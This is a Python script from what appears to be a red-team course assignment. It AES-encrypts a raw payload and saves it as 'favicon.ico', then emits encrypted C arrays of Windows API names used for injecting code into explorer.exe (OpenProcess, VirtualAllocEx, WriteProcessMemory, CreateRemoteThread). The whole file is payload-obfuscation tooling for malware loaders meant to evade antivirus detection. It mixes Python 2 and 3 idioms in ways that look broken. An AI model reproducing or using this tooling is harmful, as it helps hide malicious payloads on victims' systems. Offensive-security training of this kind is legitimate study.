# Red Team Operator course code template
# Assignment
# 
# author: reenz0h (twitter: @sektor7net)
# modified by: geobour98

import sys
import os
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = urandom(16)

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):
	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))

try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)

#print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
print('char key[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')

str_list = ["kernel32.dll", "explorer.exe", "GetProcAddress", "GetModuleHandleA", "FindResourceA", "LoadResource", "LockResource", "SizeofResource", "VirtualAlloc", "RtlMoveMemory", "CreateToolhelp32Snapshot", "Process32First", "Process32Next", "lstrcmpiA", "CloseHandle", "OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "WaitForSingleObject"]
for s in str_list:
	rext = os.path.splitext(s)[0]
	str = aesenc(s + b"\x00", KEY)
	print('unsigned char s' + rext + '[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in str) + ' };')

open("favicon.ico", "wb").write(ciphertext)
